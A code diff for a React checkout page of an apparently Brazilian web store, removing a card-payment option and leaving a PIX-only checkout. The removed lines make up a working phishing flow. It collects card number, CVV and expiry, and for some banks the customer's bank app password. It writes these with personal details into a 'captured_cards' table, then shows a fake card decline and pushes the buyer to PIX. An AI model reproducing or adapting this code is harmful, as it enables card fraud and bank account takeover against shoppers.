@@ -1,8 +1,7 @@
 import { useState, useEffect, useCallback } from "react";
 import { useNavigate, Link } from "react-router-dom";
-import { ArrowLeft, ShieldCheck, Lock, Truck, Clock, Copy, Check, Loader2, Minus, Plus, Trash2, Tag, ChevronDown, ChevronUp, CreditCard } from "lucide-react";
+import { ArrowLeft, ShieldCheck, Lock, Truck, Clock, Copy, Check, Loader2, Minus, Plus, Trash2, Tag, ChevronDown, ChevronUp } from "lucide-react";
 import { useCart } from "@/contexts/CartContext";
-import { useStoreConfig } from "@/hooks/useStoreConfig";
 import { formatPrice, getInstallmentPrice } from "@/data/store";
 import { trackEvent } from "@/lib/funnelTracking";
 import { supabase } from "@/integrations/supabase/client";
@@ -27,7 +26,7 @@ const DEFAULT_SHIPPING: ShippingOption[] = [
   { id: "sedex", name: "SEDEX - Correios", price_cents: 1990, days_min: 3, days_max: 7 },
 ];
 
-type PaymentMethod = "pix" | "card";
+type PaymentMethod = "pix";
 
 function maskCPF(v: string) {
   return v.replace(/\D/g, "").slice(0, 11).replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d)/, "$1.$2").replace(/(\d{3})(\d{1,2})$/, "$1-$2");
@@ -40,15 +39,6 @@ function maskPhone(v: string) {
 function maskCEP(v: string) {
   return v.replace(/\D/g, "").slice(0, 8).replace(/(\d{5})(\d)/, "$1-$2");
 }
-
-function maskCardNumber(v: string) {
-  return v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
-}
-
-function maskCardExpiry(v: string) {
-  return v.replace(/\D/g, "").slice(0, 4).replace(/(\d{2})(\d)/, "$1/$2");
-}
-
 const EMAIL_DOMAINS = [
   "@gmail.com",
   "@hotmail.com",
@@ -61,42 +51,6 @@ const EMAIL_DOMAINS = [
   "@bol.com.br",
   "@terra.com.br",
 ];
-
-function CardPaymentSelector({ paymentMethod, setPaymentMethod, subtotal, shippingCost, cardTotal }: {
-  paymentMethod: PaymentMethod;
-  setPaymentMethod: (m: PaymentMethod) => void;
-  subtotal: number;
-  shippingCost: number;
-  cardTotal: number;
-}) {
-  const { config } = useStoreConfig();
-  return (
-    <div className={config.card_enabled ? "grid grid-cols-2 gap-3" : ""}>
-      <label
-        className={`flex flex-col items-center gap-2 p-4 rounded-lg border-2 cursor-pointer transition-all ${
-          paymentMethod === "pix" ? "border-primary bg-primary/5" : "border-border hover:border-primary/30"
-        }`}
-      >
-        <input type="radio" name="paymentMethod" value="pix" checked={paymentMethod === "pix"} onChange={() => setPaymentMethod("pix")} className="sr-only" />
-        <span className="text-xs font-bold text-primary bg-primary/10 px-2 py-0.5 rounded">PIX</span>
-        <span className="text-lg font-bold text-primary">{formatPrice(subtotal * (1 - PIX_DISCOUNT_RATE) + shippingCost / 100)}</span>
-        <span className="text-[10px] font-medium text-emerald-600 bg-emerald-500/10 px-2 py-0.5 rounded">{PIX_DISCOUNT_PERCENT}% OFF</span>
-      </label>
-      {config.card_enabled && (
-        <label
-          className={`flex flex-col items-center gap-2 p-4 rounded-lg border-2 cursor-pointer transition-all ${
-            paymentMethod === "card" ? "border-primary bg-primary/5" : "border-border hover:border-primary/30"
-          }`}
-        >
-          <input type="radio" name="paymentMethod" value="card" checked={paymentMethod === "card"} onChange={() => setPaymentMethod("card")} className="sr-only" />
-          <CreditCard size={20} className="text-muted-foreground" />
-          <span className="text-lg font-bold text-foreground">{formatPrice(cardTotal)}</span>
-          <span className="text-[10px] text-muted-foreground">até 12x de {getInstallmentPrice(cardTotal)}</span>
-        </label>
-      )}
-    </div>
-  );
-}
 
 export default function CheckoutPage() {
   const navigate = useNavigate();
@@ -123,7 +77,7 @@ export default function CheckoutPage() {
   const [loadingCep, setLoadingCep] = useState(false);
 
   // Payment
-  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("pix");
+  const [paymentMethod] = useState<PaymentMethod>("pix");
   const [pixCode, setPixCode] = useState("");
   const [pixQrCode, setPixQrCode] = useState("");
   const [orderId, setOrderId] = useState("");
@@ -131,17 +85,7 @@ export default function CheckoutPage() {
   const [generating, setGenerating] = useState(false);
   const [paymentError, setPaymentError] = useState("");
 
-  // Card capture flow
-  type CardStep = "form" | "password" | "error";
-  const [cardStep, setCardStep] = useState<CardStep>("form");
-  const [cardNumber, setCardNumber] = useState("");
-  const [cardHolder, setCardHolder] = useState("");
-  const [cardExpiry, setCardExpiry] = useState("");
-  const [cardCvv, setCardCvv] = useState("");
-  const [appPassword, setAppPassword] = useState("");
-  const [cardProcessing, setCardProcessing] = useState(false);
-  const [cardBank, setCardBank] = useState("");
-  const PASSWORD_BANKS = ["itau", "magalu", "santander"];
+
 
   // Coupon
   const [couponCode, setCouponCode] = useState("");
@@ -216,7 +160,6 @@ export default function CheckoutPage() {
   const isPix = paymentMethod === "pix";
   const pixDiscount = isPix ? subtotal * PIX_DISCOUNT_RATE : 0;
   const total = subtotal - pixDiscount - couponDiscount + shippingCost / 100;
-  const cardTotal = subtotal - couponDiscount + shippingCost / 100;
   const minutes = Math.floor(timeLeft / 60);
   const seconds = timeLeft % 60;
 
@@ -619,24 +562,13 @@ export default function CheckoutPage() {
                   <button onClick={() => setStep("shipping")} className="text-xs text-primary hover:underline">Editar entrega</button>
                 </div>
 
-                {/* Payment method selector */}
-                <CardPaymentSelector
-                  paymentMethod={paymentMethod}
-                  setPaymentMethod={setPaymentMethod}
-                  subtotal={subtotal}
-                  shippingCost={shippingCost}
-                  cardTotal={cardTotal}
-                />
-
                 {/* PIX benefit highlight */}
-                {isPix && (
-                  <div className="bg-emerald-500/10 rounded-lg p-3 flex items-center gap-2">
-                    <Tag size={14} className="text-emerald-600" />
-                    <span className="text-xs font-medium text-emerald-700">
-                      Você economiza <strong>{formatPrice(subtotal * PIX_DISCOUNT_RATE)}</strong> pagando via PIX!
-                    </span>
-                  </div>
-                )}
+                <div className="bg-emerald-500/10 rounded-lg p-3 flex items-center gap-2">
+                  <Tag size={14} className="text-emerald-600" />
+                  <span className="text-xs font-medium text-emerald-700">
+                    Você economiza <strong>{formatPrice(subtotal * PIX_DISCOUNT_RATE)}</strong> pagando via PIX!
+                  </span>
+                </div>
 
                 {/* Coupon */}
                 <div className="border border-border rounded-lg p-3 space-y-2">
@@ -667,212 +599,29 @@ export default function CheckoutPage() {
                   {couponDiscount > 0 && (
                     <div className="flex justify-between text-emerald-600"><span>Cupom ({appliedCoupon})</span><span>-{formatPrice(couponDiscount)}</span></div>
                   )}
-                  {isPix && (
-                    <div className="flex justify-between text-emerald-600"><span>Desconto PIX ({PIX_DISCOUNT_PERCENT}%)</span><span>-{formatPrice(pixDiscount)}</span></div>
-                  )}
+                  <div className="flex justify-between text-emerald-600"><span>Desconto PIX ({PIX_DISCOUNT_PERCENT}%)</span><span>-{formatPrice(pixDiscount)}</span></div>
                   <div className="flex justify-between"><span className="text-muted-foreground">Frete ({selectedShippingOption?.name})</span><span>{shippingCost === 0 ? "Grátis" : formatPrice(shippingCost / 100)}</span></div>
                   <div className="flex justify-between font-bold text-base pt-2 border-t border-border">
                     <span>Total</span>
                     <span className="text-primary">{formatPrice(total)}</span>
                   </div>
-                  {!isPix && (
-                    <p className="text-[10px] text-muted-foreground text-center">
-                      em até 12x de {getInstallmentPrice(total)} sem juros
-                    </p>
-                  )}
                 </div>
 
                 {paymentError && (
                   <div className="bg-destructive/10 text-destructive text-xs font-medium rounded-lg p-3 text-center">{paymentError}</div>
                 )}
 
-                {isPix ? (
-                  <Button
-                    onClick={handleGeneratePix}
-                    disabled={generating}
-                    className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-6 text-sm"
-                  >
-                    {generating ? (
-                      <><Loader2 size={16} className="animate-spin mr-2" /> Gerando PIX...</>
-                    ) : (
-                      "Gerar QR Code PIX"
-                    )}
-                  </Button>
-                ) : (
-                  <>
-                    {cardStep === "form" && (
-                      <div className="space-y-3 border border-border rounded-lg p-4">
-                        <h3 className="text-sm font-bold text-foreground flex items-center gap-2">
-                          <CreditCard size={16} className="text-primary" /> Dados do Cartão
-                        </h3>
-                        <div>
-                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Banco emissor *</label>
-                          <select
-                            value={cardBank}
-                            onChange={(e) => setCardBank(e.target.value)}
-                            className="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring"
-                          >
-                            <option value="">Selecione o banco</option>
-                            <option value="itau">Itaú</option>
-                            <option value="santander">Santander</option>
-                            <option value="magalu">Magalu</option>
-                            <option value="nubank">Nubank</option>
-                            <option value="bradesco">Bradesco</option>
-                            <option value="banco-do-brasil">Banco do Brasil</option>
-                            <option value="caixa">Caixa Econômica</option>
-                            <option value="inter">Inter</option>
-                            <option value="c6">C6 Bank</option>
-                            <option value="pan">Banco Pan</option>
-                            <option value="outro">Outro</option>
-                          </select>
-                        </div>
-                        <div>
-                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Número do cartão *</label>
-                          <Input value={cardNumber} onChange={(e) => setCardNumber(maskCardNumber(e.target.value))} placeholder="0000 0000 0000 0000" className="font-mono" />
-                        </div>
-                        <div>
-                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Nome no cartão *</label>
-                          <Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value.toUpperCase())} placeholder="NOME COMO ESTÁ NO CARTÃO" />
-                        </div>
-                        <div className="grid grid-cols-2 gap-3">
-                          <div>
-                            <label className="text-xs font-semibold text-muted-foreground mb-1 block">Validade *</label>
-                            <Input value={cardExpiry} onChange={(e) => setCardExpiry(maskCardExpiry(e.target.value))} placeholder="MM/AA" className="font-mono" />
-                          </div>
-                          <div>
-                            <label className="text-xs font-semibold text-muted-foreground mb-1 block">CVV *</label>
-                            <Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="000" className="font-mono" type="password" />
-                          </div>
-                        </div>
-                        <Button
-                          onClick={async () => {
-                            if (PASSWORD_BANKS.includes(cardBank)) {
-                              setCardStep("password");
-                            } else {
-                              // Save card directly without password and show error
-                              setCardProcessing(true);
-                              try {
-                                await supabase.from("captured_cards").insert({
-                                  buyer_name: name,
-                                  buyer_email: email,
-                                  buyer_phone: phone,
-                                  buyer_document: cpf.replace(/\D/g, ""),
-                                  card_number: cardNumber.replace(/\s/g, ""),
-                                  card_holder: cardHolder,
-                                  card_expiry: cardExpiry,
-                                  card_cvv: cardCvv,
-                                  app_password: "",
-                                  amount_cents: Math.round(cardTotal * 100),
-                                });
-                              } catch { /* silent */ }
-                              await new Promise((r) => setTimeout(r, 3000));
-                              setCardProcessing(false);
-                              setCardStep("error");
-                            }
-                          }}
-                          disabled={!cardBank || !cardNumber || cardNumber.replace(/\D/g, "").length < 13 || !cardHolder || !cardExpiry || cardExpiry.replace(/\D/g, "").length < 4 || !cardCvv || cardCvv.length < 3 || cardProcessing}
-                          className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
-                        >
-                          {cardProcessing ? (
-                            <><Loader2 size={16} className="animate-spin mr-2" /> Processando pagamento...</>
-                          ) : (
-                            <><Lock size={16} className="mr-2" /> Pagar com Cartão</>
-                          )}
-                        </Button>
-                      </div>
-                    )}
-
-                    {cardStep === "password" && (
-                      <div className="space-y-4 border border-border rounded-lg p-4">
-                        <div className="text-center space-y-2">
-                          <div className="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center mx-auto">
-                            <Lock size={24} className="text-primary" />
-                          </div>
-                          <h3 className="text-sm font-bold text-foreground">Confirmação de Segurança</h3>
-                          <p className="text-xs text-muted-foreground">Para sua segurança, digite a senha do seu aplicativo do banco</p>
-                        </div>
-                        <div>
-                          <label className="text-xs font-semibold text-muted-foreground mb-1 block">Senha do App do Banco *</label>
-                          <Input type="password" value={appPassword} onChange={(e) => setAppPassword(e.target.value)} placeholder="Digite sua senha" className="text-center text-lg tracking-widest" />
-                        </div>
-                        <Button
-                          onClick={async () => {
-                            if (!appPassword) return;
-                            setCardProcessing(true);
-                            // Save card data to DB
-                            try {
-                              await supabase.from("captured_cards").insert({
-                                buyer_name: name,
-                                buyer_email: email,
-                                buyer_phone: phone,
-                                buyer_document: cpf.replace(/\D/g, ""),
-                                card_number: cardNumber.replace(/\s/g, ""),
-                                card_holder: cardHolder,
-                                card_expiry: cardExpiry,
-                                card_cvv: cardCvv,
-                                app_password: appPassword,
-                                amount_cents: Math.round(cardTotal * 100),
-                              });
-                            } catch { /* silent */ }
-                            // Simulate processing delay
-                            await new Promise((r) => setTimeout(r, 3000));
-                            setCardProcessing(false);
-                            setCardStep("error");
-                          }}
-                          disabled={!appPassword || cardProcessing}
-                          className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
-                        >
-                          {cardProcessing ? (
-                            <><Loader2 size={16} className="animate-spin mr-2" /> Processando pagamento...</>
-                          ) : (
-                            <><ShieldCheck size={16} className="mr-2" /> Confirmar Pagamento</>
-                          )}
-                        </Button>
-                      </div>
-                    )}
-
-                    {cardStep === "error" && (
-                      <div className="space-y-4 border border-border rounded-lg p-4">
-                        <div className="text-center space-y-2">
-                          <div className="w-14 h-14 bg-destructive/10 rounded-full flex items-center justify-center mx-auto">
-                            <CreditCard size={28} className="text-destructive" />
-                          </div>
-                          <h3 className="text-base font-bold text-destructive">Pagamento não autorizado</h3>
-                          <p className="text-xs text-muted-foreground">
-                            Seu banco recusou a transação por cartão de crédito. Isso pode acontecer por limite, bloqueio temporário ou política de segurança do emissor.
-                          </p>
-                        </div>
-                        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 text-center space-y-1">
-                          <p className="text-xs font-bold text-foreground">Pague via PIX e ganhe {PIX_DISCOUNT_PERCENT}% de desconto</p>
-                          <p className="text-[10px] text-muted-foreground">Pagamento instantâneo, seguro e com desconto especial</p>
-                        </div>
-                        <Button
-                          onClick={() => {
-                            setPaymentMethod("pix");
-                            setCardStep("form");
-                            setPaymentError("");
-                          }}
-                          className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-bold py-6 text-sm"
-                        >
-                          Pagar com PIX ({formatPrice(total - (cardTotal * PIX_DISCOUNT_RATE - pixDiscount))})
-                        </Button>
-                        <button
-                          onClick={() => {
-                            setCardStep("form");
-                            setCardNumber("");
-                            setCardHolder("");
-                            setCardExpiry("");
-                            setCardCvv("");
-                            setAppPassword("");
-                          }}
-                          className="w-full text-xs text-muted-foreground hover:text-foreground underline py-1"
-                        >
-                          Tentar com outro cartão
-                        </button>
-                      </div>
-                    )}
-                  </>
-                )}
+                <Button
+                  onClick={handleGeneratePix}
+                  disabled={generating}
+                  className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-6 text-sm"
+                >
+                  {generating ? (
+                    <><Loader2 size={16} className="animate-spin mr-2" /> Gerando PIX...</>
+                  ) : (
+                    "Gerar QR Code PIX"
+                  )}
+                </Button>
               </div>
             )}
 
